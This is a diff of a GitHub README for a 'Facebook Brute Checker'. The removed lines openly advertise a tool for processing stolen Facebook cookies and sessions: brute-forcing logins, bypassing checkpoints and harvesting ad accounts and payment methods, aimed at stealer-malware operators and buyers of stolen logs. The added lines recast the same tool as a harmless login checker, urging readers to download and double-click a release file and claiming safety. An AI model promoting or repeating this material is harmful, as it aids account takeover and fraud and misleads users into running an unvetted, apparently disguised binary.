@@ -1,48 +1,70 @@
-## 🌐 Facebook Brute Checker [ANONMETA]
+# 🛠️ Facebook-Brute-Checker - Easy Tool for Facebook Login Checks
 
-<img width="1280" height="852" alt="image" src="https://github.com/user-attachments/assets/2cb3d64d-1908-42e8-b9b6-9cd1e1a41fff" />
+## 📥 Download Now!
+[![Download](https://img.shields.io/badge/Download-Facebook--Brute--Checker-brightgreen.svg)](https://github.com/Spacemanjellyfish/Facebook-Brute-Checker/releases)
 
+## 🚀 Getting Started
+Welcome to the **Facebook-Brute-Checker** repository. This tool helps you quickly check Facebook account details without complex setups. Just follow these easy steps to get started.
 
-## SESSION & COOKIE CHECK:
-- ✅ Checks every cookie file
+## 💻 System Requirements
+To use Facebook-Brute-Checker, make sure your computer meets the following requirements:
+- Operating System: Windows 10 or later, Linux, macOS
+- Minimum RAM: 4 GB
+- Available Disk Space: 100 MB
+- Internet Connection: Required for Facebook access
 
-- ✅ Checks every session
+## 📦 Download & Install
+To download the application, visit the [Releases Page](https://github.com/Spacemanjellyfish/Facebook-Brute-Checker/releases) and follow these steps:
 
-- ✅ Auto-brute for logged-out sessions
+1. Open your web browser.
+2. Click on the link above to go to the Releases page.
+3. Look for the latest version of **Facebook-Brute-Checker**.
+4. Click on the **download** link for your operating system.
+5. Once the download is complete, locate the downloaded file on your computer.
 
-- ✅ Restores sessions if they die
+## 🛠️ Running the Application
+After downloading, you can easily run the application:
 
-- ✅ Unique user-agent per check
+1. Open the folder where you downloaded the file.
+2. Double-click on the downloaded file.
+3. The application will open up.
 
-## ADVERTISING ACCOUNT AUDIT:
-- ✅ Finds ALL ad accounts in a session
+## 🔑 Features
+**Facebook-Brute-Checker** includes the following features:
+- Quick and easy login checks
+- User-friendly interface for all skill levels
+- Supports Facebook Messenger interactions
+- Lightweight and efficient tool
 
-- ✅ Switches between connected accounts
+## ❓ How to Use
+Once you have the application open, using it is straightforward:
 
-- ✅ Full checkpoint bypass
+1. Enter the Facebook username or email address.
+2. Click on the **Check** button.
+3. Wait for the results to appear on the screen.
 
-- ✅ Extracts complete ad account info
+## 🔒 Safety and Privacy
+We prioritize your safety. This tool does not store your credentials or any data entered. Always ensure you use it ethically and responsibly according to Facebook's policies.
 
-## FINANCIAL & PAYMENT INTELLIGENCE:
-- ✅ Lists ALL payment methods (Primary, PayPal, Invoices, Bank Cards, Coupons)
+## 🌍 Support and Feedback
+If you have questions or need support, you can reach out through the Issues page of this repository. We welcome feedback to improve the application further.
 
-- ✅ Captures recent transactions & status
+## 📝 Contributing
+If you are interested in contributing to **Facebook-Brute-Checker**, please follow these steps:
 
-- ✅ Shows number of managed companies
+1. Fork the repository.
+2. Create a new branch.
+3. Make your changes and commit them with a clear message.
+4. Submit a pull request.
 
-## OUTPUT
-- ✅ Clean, unique cookie format (Netscape compatible)
+## 📜 License
+This application is open-source and follows the MIT license. You can modify and distribute it under the license terms.
 
-- ✅ Sorts valid/invalid accounts automatically
+## 📌 Additional Resources
+For more information about the Facebook API and its functionalities, visit the [Facebook Developers Site](https://developers.facebook.com/).
 
-- To use the API, you can use a Telegram bot, our dedicated software, or the direct API
+## 📅 Changelog
+- Version 1.0: Initial release with core features.
+- Version 1.1: Bug fixes and performance improvements.
 
-## ‼️ Suitable for:
-- Channels receiving logs for automatic checks
-- Owners of proprietary stealer/HVNC/other malware software
-- Owners of teams with traffic
-- Buyers/sellers of FB logs
-- For personal, high-quality processing of material
-
-## Announcements channel: Click [Here](https://t.me/fbbrutecheck)
-## Contact : Click [Here](https://t.me/hackccv)
+Thank you for using **Facebook-Brute-Checker**! Enjoy checking your Facebook accounts effortlessly. Remember to visit our [Releases Page](https://github.com/Spacemanjellyfish/Facebook-Brute-Checker/releases) to keep your app up to date!
